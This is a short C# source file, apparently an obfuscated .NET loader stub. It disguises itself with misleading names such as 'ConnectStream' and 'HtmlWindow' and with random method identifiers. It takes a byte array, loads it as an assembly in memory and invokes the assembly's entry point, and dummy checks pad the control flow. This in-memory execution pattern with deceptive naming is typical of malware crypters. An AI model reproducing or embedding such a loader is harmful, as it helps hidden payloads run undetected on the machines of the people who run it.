using System;
using System.Reflection;
using System.Runtime.CompilerServices;

public class ConnectStream
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public ConnectStream()
	{
		eXCibg13TysOxy3wdq(this);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static void eXCibg13TysOxy3wdq(object object_0)
	{
	}

	public static object c(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(cmon(entryPoint));
	}

	public static void l(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(c(assembly, entryPoint), null);
	}

	public static string cmon(MethodInfo entryPoint)
	{
		return (string)x6kr17pW1vDx4pBcGg(entryPoint);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void HtmlWindow(byte[] ITypeDescriptorFilterService)
	{
		bQNf87w1rI99WHSMMy();
		if (bYXY7I0VtT9OKyWXpV())
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(ITypeDescriptorFilterService);
			MethodInfo entryPoint = assembly.EntryPoint;
			if (bQNf87w1rI99WHSMMy())
			{
			}
			l(assembly, entryPoint);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static object x6kr17pW1vDx4pBcGg(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static bool bYXY7I0VtT9OKyWXpV()
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static bool bQNf87w1rI99WHSMMy()
	{
		return false;
	}
}
